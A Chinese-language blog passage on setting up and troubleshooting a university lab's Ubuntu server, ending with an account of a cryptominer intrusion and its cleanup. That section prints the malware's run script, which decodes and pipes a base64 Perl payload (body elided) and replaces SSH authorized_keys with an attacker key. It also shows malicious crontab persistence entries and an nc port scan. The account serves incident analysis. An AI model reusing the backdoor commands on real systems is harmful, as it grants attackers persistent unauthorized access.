<span class="token function">sudo</span> <span class="token function">cp</span> /etc/fail2ban/fail2ban.conf /etc/fail2ban/fail2ban.local
<span class="token function">sudo</span> <span class="token function">cp</span> /etc/fail2ban/jail.conf /etc/fail2ban/jail.local<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>配置文件修改.local, 会像next.yml一样把.conf文件自动覆盖掉（直接修改那两个conf下次更新可能会覆盖掉）。</p>
<p>主要参数就是那个bantime和maxretry，这里我设成2小时和10次</p>
<p>然后启动</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl start fail2ban
systemctl <span class="token builtin class-name">enable</span> fail2ban<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>其他操作</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">fail2ban-client <span class="token builtin class-name">set</span> sshd addignoreip <span class="token operator">&lt;</span>IP<span class="token operator">></span> <span class="token comment"># IP白名单</span>
fail2ban-client <span class="token builtin class-name">set</span> sshd unbanip <span class="token operator">&lt;</span>IP<span class="token operator">></span> <span class="token comment"># 解封IP</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>还要配置一下防火墙 iptables很繁琐，不涉及太多配置的情况下可以用UFW</p>
<h3 id="防火墙端口">防火墙端口</h3>
<p>端口用的时候要打开，不然会出各种烦人的问题，比如wget下载没开443就会<code>443... failed: Connection refused.</code>，如果你加了~--no-check-certificate`还是failed，那八成是防火墙的问题 查看端口开放状态</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">netstat</span> -ntlp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>或者</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">telnet <span class="token function">ip</span> port<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>Ubuntu里用ufw查看状态</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> ufw status<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>查看指定端口的状态（没输出可能是没开）</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">netstat</span> -ntlp<span class="token operator">|</span><span class="token function">grep</span> <span class="token number">443</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>打开443端口</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">iptables -I INPUT -p tcp --dport <span class="token number">443</span> -j ACCEPT
<span class="token function">service</span> iptables save
<span class="token function">service</span> iptables restart<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>使用UFW, 直接</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> ufw allow <span class="token number">443</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>用iptables打开指定端口, 一般开80，443，53，22，其他按需打开</p>
<p>可以安装这个来永久保存配置</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> iptables-persistent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="docker默认修改iptables规则">Docker默认修改iptables规则</h3>
<p>Docker不设置会默认修改iptables规则，将端口暴露在外面，导致端口映射在安全上并没有什么卵用，要设置一下一下，可以看这里 <span class="exturl" data-url="aHR0cHM6Ly93d3cuYmluc3MubWUvYmxvZy9kb2NrZXItcGFzcy10aHJvdWdoLXN5c3RlbS1maXJld2FsbC8=">https://www.binss.me/blog/docker-pass-through-system-firewall/<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="https">HTTPs</h2>
<p>申请SSL证书</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> ssl-cert<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后搞一个自己的域名，因为境内服务器要备案，此计划中道崩殂</p>
<h2 id="运行sudo-apt-get-update报错">运行<code>sudo apt-get update</code>报错</h2>
<p>写在前面，我看到有的镜像源示例配置都是走的HTTPS，似乎没有必要 详见<span class="exturl" data-url="aHR0cHM6Ly93aHlkb2VzYXB0bm90dXNlaHR0cHMuY29tLw==">Why does APT not use HTTPS?<i class="fa fa-external-link-alt"></i></span>。 至于某Debian镜像源上说的什么安装apt-transport-https更是没有必要，画蛇添足</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">Get:1 http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu xenial InRelease [454 B]
Get:2 http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu xenial-updates InRelease [454 B]
Get:3 http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu xenial-backports InRelease [454 B]
Get:4 http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu xenial-security InRelease [454 B]
Err:1 http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu xenial InRelease
  Clearsigned file isn&#39;t valid, got &#39;NOSPLIT&#39; (does the network require authentication?)
Err:2 http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu xenial-updates InRelease
  Clearsigned file isn&#39;t valid, got &#39;NOSPLIT&#39; (does the network require authentication?)
Err:3 http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu xenial-backports InRelease
  Clearsigned file isn&#39;t valid, got &#39;NOSPLIT&#39; (does the network require authentication?)
Err:4 http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu xenial-security InRelease
  Clearsigned file isn&#39;t valid, got &#39;NOSPLIT&#39; (does the network require authentication?)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>查了一下说是代理的问题，看了一下教研室的工作站竟然还有酸酸乳和bbr，一问师兄说是老板外出的时候想上学校网用这个，行吧</p>
<p>设置一下apt的代理</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">&#x2F;etc&#x2F;apt$ cat apt.conf

Acquire::http::proxy &quot;http:&#x2F;&#x2F;&lt;proxy&gt;&quot;;
Acquire::https::proxy &quot;https:&#x2F;&#x2F;&lt;proxy&gt;&quot;;
Acquire::ftp::proxy &quot;ftp:&#x2F;&#x2F;&lt;proxy&gt;&quot;;
Acquire::socks::proxy &quot;socks:&lt;proxy&gt;&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里我切进目录没找到，发现有个apt.conf.d文件夹，是表示缺省的配置文件，删掉换成apt.conf 比如代理是1.2.3.4，端口1234 就改成<code>Acquire::http::proxy "http://1.2.3.4:1234</code></p>
<p>改了一下发现不对，这边是服务端应该没开代理啊</p>
<p>把代理都删了</p>
<p>感觉可能DNS有问题,切到<code>etc/resolv.conf</code>看了一下</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">nameserver 202.112.14.21
nameserver 202.112.14.11<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>这个学校的DNS服务不行啊，别的都直通互联网，这个上不了谷歌不说，还经常不对外网提供解析服务 (能ping通,但是nslookup发现不对外网提供服务) 又看了一下工作站的DNS, 果然换过了 校园网暂时也没什么好的DNS，就先换了清华的 (那个DNS不是<code>/etc/resolv.conf</code>下的，要改<code>/etc/resolvconf/resolv.conf.d</code>下的<code>base</code>文件,第一个只是临时的DNS)</p>
<p>还要刷新一下DNS：<code>sudo service networking restart</code></p>
<p>运行<code>sudo apt-get upgrade</code>又报了这个错<code>Hash Sum mismatch</code></p>
<p>查了一下发现就是阿里云镜像源在教育网下的问题</p>
<p>算了,改镜像源吧,换了清华的</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">Err:1 https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu xenial InRelease
  Failed to connect to mirrors.tuna.tsinghua.edu.cn port 443: Connection timed out<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>依然不行, 决定明天重装</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">E: Some index files failed to download. They have been ignored, or old ones used instead.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>看了一下，工作站那台DNS是<code>cat /etc/resolv.conf</code>是127.0.0.1，是DNSmasq托管的，而服务器上的还是你电的DNS，决定改了。 工作站上应该是这样的</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log"># &#x2F;etc&#x2F;network&#x2F;interfaces
dns-nameservers 8.8.8.8<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>改了之后服务器的<code>resolv.conf</code>也是<code>127.0.0.1</code>了 又上大清的网站看了一下，发现居然在维护</p>
<p><img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/20191115103425.png" alt="Picture" style="zoom:80%;" /></p>
<p>换成你电的，好了，收工</p>
<p><img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/ubuntu-apt.png" alt="Picture" style="zoom:80%;" /></p>
<p>又报了<code>Target Translations (main/i18n/Translation-en) is configured multiple times in</code>, 查了一下是指定apt源冲突了，删掉一个就好了</p>
<h2 id="查看配置">查看配置</h2>
<p>本来想用neofetch查看一下服务器的配置，结果apt装不了。 看了一下官方文档发现16.10要这样</p>
<p>Add PPA <code>sudo add-apt-repository ppa:dawidd0811/neofetch</code> Update repositories <code>sudo apt update</code> Install the package <code>sudo apt install neofetch</code> （安装neofetch还能下载编译，可能还快一点）</p>
<p>算了，好慢啊，直接用<code>sudo dmidecode</code>看吧，screenfetch也行 英特尔的e5 2630 v4，20核CPU，没显卡。这CPU平时居然没人用，空跑,居然还有公网ip，我仿佛发现了宝藏。不出意外就留给我挥（bei）霍（guo）了</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">                         .&#x2F;+o+-       root@labserver
                 yyyyy- -yyyyyy+      OS: Ubuntu 16.04 xenial
              :&#x2F;&#x2F;+&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;-yyyyyyo      Kernel: x86_64 Linux 4.12.14-041214-generic
          .++ .:&#x2F;++++++&#x2F;-.+sss&#x2F;&#96;      Uptime: 21h 36m
        .:++o:  &#x2F;++++++++&#x2F;:--:&#x2F;-      Packages: 718
       o:+o+:++.&#96;..&#96;&#96;&#96;.-&#x2F;oo+++++&#x2F;     Shell: bash 4.3.48
      .:+o:+o&#x2F;.          &#96;+sssoo+&#x2F;    WM: Not Found
 .++&#x2F;+:+oo+o:&#96;             &#x2F;sssooo.   CPU: Intel Xeon CPU E5-2630 v4 @ 3.1GHz
&#x2F;+++&#x2F;&#x2F;+:&#96;oo+o               &#x2F;::--:.   RAM: 1348MiB &#x2F; 32074MiB
\+&#x2F;+o+++&#96;o++o               ++&#x2F;&#x2F;&#x2F;&#x2F;.
 .++.o+++oo+:&#96;             &#x2F;dddhhh.
      .+.o+oo:.          &#96;oddhhhh+
       \+.++o+o&#96;&#96;-&#96;&#96;&#96;&#96;.:ohdhhhhh+
        &#96;:o+++ &#96;ohhhhhhhhyo++os:
          .o:&#96;.syhhhhhhh&#x2F;.oo++o&#96;
              &#x2F;osyyyyyyo++ooo+++&#x2F;
                  &#96;&#96;&#96;&#96;&#96; +oo+++o\:
                         &#96;oo++.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="更新">更新</h2>
<p>发现不是镜像源的问题，是你电的镜像源没安排上https，这个服务器好像是证书的问题，https全都用不了，wget也不行。</p>
<h2 id="滚动升级">滚动升级</h2>
<p>不存在的，这又不是arch系，不要乱升，乱升级滚挂了是要背锅的 要升可以用</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> do-release-upgrade<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>升完记得把apt源给换了 看到有安全更新，说 &gt;<strong><em>System restart required</em></strong></p>
<p>reboot一下就行了</p>
<h2 id="网络问题">网络问题</h2>
<h3 id="网很慢">网很慢</h3>
<p>很迷，有的地方很快，有的地方就几乎慢到断线。我的联通就经常ping不同。 据说老蔡师兄他那里也经常ping不通</p>
<p><img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/ping-ubuntu.jpg" alt="Picture" style="zoom:60%;" /></p>
<p>就是网不好。。。而且上行网速更差，有的时候只有100k/s（用的是一个月20块的基础套餐，没加钱）</p>
<pre class="line-numbers language-none"><code class="language-none">Testing download speed..................................
Download: 11.72 Mbyte&#x2F;s
Testing upload speed....................................
Upload: 2.45 Mbyte&#x2F;s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="掉线">掉线</h3>
<p>受疫情影响，全教研室在家连服务器，但是服务器的网络还总掉线 跑一个自动重启网络服务的脚本，直接抄<span class="exturl" data-url="aHR0cDovL3d3dy5saXV4aWFvLm9yZy8yMDE5LzA4L3VidW50dS3kuIvnm5Hmjqflubboh6rliqjph43lkK/nvZHljaEv">这里<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="备份和恢复">备份和恢复</h2>
<p>师兄也没装什么东西，用的cp直接备份了点文件，一言不合重装系统。 先暂时用cp备份一次 挂载一下盘(比如挂到/mnt/mydata)，用cp复制 (挂载看这里<a href="#fn2" class="footnote-ref" id="fnref2" role="doc-noteref"><sup>2</sup></a>)</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">mount</span> /dev/sdb7 /mnt
<span class="token function">nohup</span> <span class="token function">cp</span> -pdr /srv /mnt/mydata <span class="token operator">>></span> logs.out <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">&amp;</span>
<span class="token function">umount</span> /dev/sdb7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>这样将/srv目录下的文件全部拷贝到mydata下面. 文件很大，cp没有进度条，以后试试gcp之类的命令，先这样吧</p>
<p>看了一下，有接近300G的数据，用cp命令太慢了 用dd，把,整盘拷贝（dd命令不要乱用，一不小心就删库了）</p>
<p>拷贝完<code>umount /mydata</code>再拔</p>
<p>下次试试rsync同步，据说能断点续传和md5验证</p>
<p>更新，发现一款叫clonezilla的软件，使用clonezilla备份非常方便。</p>
<h2 id="使用教研室服务器下载">使用教研室服务器下载</h2>
<p>教研室的服务器有一个单独的猫和ip，网速绝大多数时候不低于50M/s，今天才发现比我的小破工位上的网速快不少。 以后下数据集和数据库文件之类的大东西就用它了！</p>
<h2 id="使用tmux">使用Tmux</h2>
<p>（其实MobaXterm有一个叫Multiexec的功能） 正在备份文件结果网断了（没办法，校园网就是这么....） 这时就要用tmux之类的工具了</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> tmux<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="图形界面">图形界面</h2>
<p>MobaXterm内嵌有Xserver，可以调出图形化窗口。 比如nedit,Emacs之类的 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/xserver.png" alt="Picture" style="zoom:80%;" /> 已经足够应付简单的图形化界面需求了 完整的桌面需求请直接VNC或teamviewer到工作站操作。</p>
<h2 id="卸载遗留的docker并重装">卸载遗留的Docker并重装</h2>
<p>目前还报这样的错</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">Cannot connect to the Docker daemon at unix:&#x2F;&#x2F;&#x2F;var&#x2F;run&#x2F;docker.sock. Is the docker daemon running?<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>似乎重装iptables的时候会直接把那个Docker的一部分依赖卸掉 （Docker好像还会直接修改默认的防火墙规则，emmmm)</p>
<p>更新，解决了，是网络问题，离线装就好了</p>
<h2 id="教研室的阿里云">教研室的阿里云</h2>
<p>真的，有毒哇 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/apt.png" alt="Picture" style="zoom:80%;" /> 是的，师兄跟我说没有apt。。。<strong>行吧</strong></p>
<p>装一个</p>
<p>等等，不对劲，这是Centos啊</p>
<p><img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/centos.png" alt="Picture" style="zoom:80%;" /></p>
<p>行吧...........那没事了。师兄真的.....我感觉我上了贼船</p>
<h2 id="报备">报备</h2>
<p>按学校信息中心的要求，固定IP都需要申请报备，还有一堆乱七八糟的事</p>
<h3 id="系统日志和杀毒">系统日志和杀毒</h3>
<p>学校信息中心要求备份系统日志和杀软。 然而这Linux有什么装杀软的必要吗？防火墙就完事了。 行吧，交差还是要装模做样的应付一下</p>
<p>安装ClamAV：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> clamav<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>直接扫描报错了，要升级病毒库<code>sudo freshclam</code></p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">LibClamAV Error: cli_loaddbdir(): No supported database files found in &#x2F;var&#x2F;lib&#x2F;clamav
ERROR: Can&#39;t open file or directory<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>然后扫一下</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nohup</span> clamscan -r -i /  <span class="token operator">&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>系统安装日志，不知道要交什么，索性把apt和dpkg的日志交了,在<code>/var/log/</code>和<code>/var/log/apt/</code>目录下面</p>
<h3 id="端口报备">端口报备</h3>
<p>一般22，80，443，再加上几个常用的端口就够了 实在不行还有端口转发</p>
<p>看一下开了的端口</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> -znv <span class="token number">211</span>.XXX.XXX.XXX <span class="token number">1</span>-10000  <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">|</span> <span class="token function">grep</span> succeeded<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="域名">域名</h3>
<p>暂时还没有，备案麻烦没弄</p>
<h2 id="清理trash">清理Trash</h2>
<p>工作站桌面变得非常卡，clamscan扫描home目录也扫了整整两天，看了一下发现有前前任师兄几百个G的数据。使用rm之后跑到了.local文件夹下。使用跑路命令把它们删掉。(最好不要把 .local全删了，只删Trash就行了<code>.local/share/Trash</code>)</p>
<h2 id="其他">其他</h2>
<p>Gitlab占用过高的问题等见瞎折腾记录(其实没有特殊需求可以用Gogs，小声逼逼) 在服务器上部署jupyter参考<span class="exturl" data-url="aHR0cHM6Ly9iaXRtaW5ndy5jb20vMjAxNy8wNy8wOS9ydW4tanVweXRlci1ub3RlYm9vay1zZXJ2ZXIv">搭建 ipython/jupyter notebook 服务器<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="远程开发">远程开发</h2>
<p>为什么要远程呢，因为我的电脑是小破i5，8G内存，装双系统不太行，虚拟机更不行。用wsl真的不如直接上服务器20核CPU、工作站两块1080pi（还有单独的网线和公网IP）。配合SSH端口转发和VSCode、JB全家桶，还是很舒服的。</p>
<h2 id="部署项目">部署项目</h2>
<h3 id="标注工具doccano">标注工具doccano</h3>
<p>这里以开源标注工具doccano为例（该项目提供了Docker镜像和直接部署的方法以及docker-compose示例文件，还给了aws等一键部署脚本）</p>
<p>我们clone下来，修改settings.py文件</p>
<p>最简单的方法就是直接上docker</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">git</span> clone https://github.com/doccano/doccano.git
$ <span class="token builtin class-name">cd</span> doccano
$ docker-compose -f docker-compose.prod.yml up<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>docker打包通常会很大，动不动就上G了，一些轻量且不至于弄坏系统环境的东西建议还是裸跑</p>
<h2 id="一次被黑记录">一次被黑记录</h2>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">CPU  [||||||||||||||||                 51.8%]   CPU -    51.8%  nice:     0.0%  ctx_sw:    8K   MEM -   21.7%  active:    5.31G   SWAP -    0.0%   LOAD    20-core
MEM  [|||||||                          21.7%]   user:    51.3%  irq:      0.0%  inter:   5508   total:  31.3G  inactive:  4.27G   total:    976M  
····
lo                         0b     0b   999.5  0.0   2.34G 2.44M   2654 root        67h8:58 16    0 S    ? ?    .&#x2F;cron
2020-01-15 16:17:54 CST<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>症状：昨天（2020.1.14）root上不去了，rsa密钥也挂了，以为是网的问题，今天一试还不行。用自己的另一个账号登了一下，发现<code>su root</code>居然permission denied了。怀疑是被黑了，一看系统占用，有挖矿程序在跑，而且网络带宽占用也很高，怀疑是被当成肉鸡对外攻击了。看了一下系统日志，是一月13号被黑的，照着网上清了一遍。从此禁用密码登录（之前就想禁，师兄嫌麻烦）。MySQL也禁用密码改ssl</p>
<p>clamav再扫一遍</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nohup</span> clamscan -r /root <span class="token number">2</span> <span class="token operator">>></span> err.out <span class="token operator">&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>更新：</p>
<p>之前没清干净，貌似又被黑了</p>
<p>症状，运行<code>apt update</code>的时候</p>
<pre class="line-numbers language-none"><code class="language-none">Errors were encountered while processing:
 clamav-freshclam
 clamav
E: Sub-process &#x2F;usr&#x2F;bin&#x2F;dpkg returned an error code (1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>然而运行了一下freshclam</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@xi102:~<span class="token comment"># freshclam</span>
Sat Mar  <span class="token number">7</span> <span class="token number">16</span>:49:25 <span class="token number">2020</span> -<span class="token operator">></span> ClamAV update process started at Sat Mar  <span class="token number">7</span> <span class="token number">16</span>:49:25 <span class="token number">2020</span>
Sat Mar  <span class="token number">7</span> <span class="token number">16</span>:49:25 <span class="token number">2020</span> -<span class="token operator">></span> daily.cld database is up to <span class="token function">date</span> <span class="token punctuation">(</span>version: <span class="token number">25743</span>, sigs: <span class="token number">2209759</span>, f-level: <span class="token number">63</span>, builder: raynman<span class="token punctuation">)</span>
Sat Mar  <span class="token number">7</span> <span class="token number">16</span>:49:25 <span class="token number">2020</span> -<span class="token operator">></span> main.cvd database is up to <span class="token function">date</span> <span class="token punctuation">(</span>version: <span class="token number">59</span>, sigs: <span class="token number">4564902</span>, f-level: <span class="token number">60</span>, builder: sigmgr<span class="token punctuation">)</span>
Sat Mar  <span class="token number">7</span> <span class="token number">16</span>:49:25 <span class="token number">2020</span> -<span class="token operator">></span> bytecode.cvd database is up to <span class="token function">date</span> <span class="token punctuation">(</span>version: <span class="token number">331</span>, sigs: <span class="token number">94</span>, f-level: <span class="token number">63</span>, builder: anvilleg<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>居然显示病毒库是最新的</p>
<p>可疑进程 /opt/atlassian/confluence/jre//bin/java -Djava.ut</p>
<p>然后看了一下有没有可疑的定时任务</p>
<pre class="line-numbers language-none"><code class="language-none">root@xi102:~# crontab -l
0 0 *&#x2F;3 * * &#x2F;root&#x2F;.bashtemp&#x2F;a&#x2F;upd&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1
@reboot &#x2F;root&#x2F;.bashtemp&#x2F;a&#x2F;upd&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1
5 8 * * 0 &#x2F;root&#x2F;.bashtemp&#x2F;b&#x2F;sync&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1
@reboot &#x2F;root&#x2F;.bashtemp&#x2F;b&#x2F;sync&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1
0 0 *&#x2F;3 * * &#x2F;tmp&#x2F;.X19-unix&#x2F;.rsync&#x2F;c&#x2F;aptitude&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>那个tmp下面有的时候是<code>0 0 */3 * * /tmp/.X21-unix/.rsync/c/aptitude&gt;/dev/null 2&gt;&amp;1</code></p>
<p>这个<code>.X某某-unix</code>应该是想伪装成<code>.X11-unix</code>X11转发的临时文件</p>
<p>root@xi102:~/.bashtemp# ps aux | grep cron root 140526 0.0 0.0 12944 1028 pts/1 S+ 17:16 0:00 grep --color=auto cron</p>
<p>看了一下这个目录下面，有鬼，应该就是它了</p>
<pre class="line-numbers language-none"><code class="language-none">root@xi102:~&#x2F;.bashtemp# ls
a  b  cron.d  dir2.dir<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>谷歌随手一搜这个.bashtemp，全都是被挖矿的被黑的，先干掉再说 http://blog.itpub.net/31559758/viewspace-2667801/ https://www.anquanke.com/post/id/197662 更新，又看到几个的 http://m.lanhusoft.com/Article/745.html https://yulijia.net/cn/操作系统/2020/03/03/Trojan-attack-analysis.html#fn:2 把这个文件夹拉下来，可以看到里面有个run文件</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>
<span class="token function">nohup</span> ./stop<span class="token operator">>></span>/dev/null <span class="token operator">&amp;</span>
<span class="token function">sleep</span> <span class="token number">5</span>
<span class="token builtin class-name">echo</span> <span class="token string">"ZXZhbCB1bnBh....这里太长略过..."</span> <span class="token operator">|</span> base64 --decode <span class="token operator">|</span> perl
<span class="token builtin class-name">cd</span> ~ <span class="token operator">&amp;&amp;</span> <span class="token function">rm</span> -rf .ssh <span class="token operator">&amp;&amp;</span> <span class="token function">mkdir</span> .ssh <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">echo</span> <span class="token string">"ssh-rsa AAAAB3N...
这里一段密钥太长略过...fckr"</span><span class="token operator">>></span>.ssh/authorized_keys <span class="token operator">&amp;&amp;</span> <span class="token function">chmod</span> -R <span class="token assign-left variable">go</span><span class="token operator">=</span> ~/.ssh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里的rsa密钥和那一串base64编码的perl脚本太长，单独放出来</p>
<p>rsa：</p>
<pre class="line-numbers language-none"><code class="language-none">AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2&#x2F;9p7+vD0EpZ3Tz&#x2F;+0kX34uAx1RV&#x2F;75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw&#x3D;&#x3D; mdrfckr<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>perl脚本（base64解码之后）：</p>
<pre class="line-numbers language-none"><code class="language-none">eval unpack u&#x3D;&gt;q&#123;_&quot;FUY(...中间这一段还是太长略过...&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>使用perl的unpack把后面那一段解包之后还是有900多行，太长了，放到Github gist上了<a href="#fn3" class="footnote-ref" id="fnref3" role="doc-noteref"><sup>3</sup></a> (按照挖矿佬的风俗是不是应该放到pastebin上？)</p>
<p>我上面放的那两篇文章里的情况和这个几乎一样。大概就是先运行一个<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLnRyZW5kbWljcm8uY29tL3RyZW5kbGFicy1zZWN1cml0eS1pbnRlbGxpZ2VuY2Uvb3V0bGF3LWhhY2tpbmctZ3JvdXBzLWJvdG5ldC1vYnNlcnZlZC1zcHJlYWRpbmctbWluZXItcGVybC1iYXNlZC1iYWNrZG9vci8=">perl的脚本<i class="fa fa-external-link-alt"></i></span>，然后把你的SSH密钥删了，插入它的后门密钥。进程伪装成rsync之类的东西。运行后会在<code>\tmp\</code>下面产生一个<span class="exturl" data-url="aHR0cHM6Ly9ibG9ncy5qdW5pcGVyLm5ldC9lbi11cy90aHJlYXQtcmVzZWFyY2gvZG90YTMtaXMteW91ci1pbnRlcm5ldC1vZi10aGluZ3MtZGV2aWNlLW1vb25saWdodGluZw==">dota3文件<i class="fa fa-external-link-alt"></i></span></p>
<p>看到了一个可疑的欧洲IP：45.9.148.125 和一个可疑的网站：www.minpop.com</p>
<h3 id="后续清理工作">后续清理工作</h3>
<p>干掉定时任务<code>crontab -e</code>,把上面那几条定时任务全删了 删除<code>~/.ssh</code>目录底下可疑的authorized_keys 删除定时任务中的可疑文件夹<code>.bashtemp</code>和<code>.X21-unix</code></p>
<h2 id="注">注</h2>
<section class="footnotes" role="doc-endnotes">
<hr />
<ol>
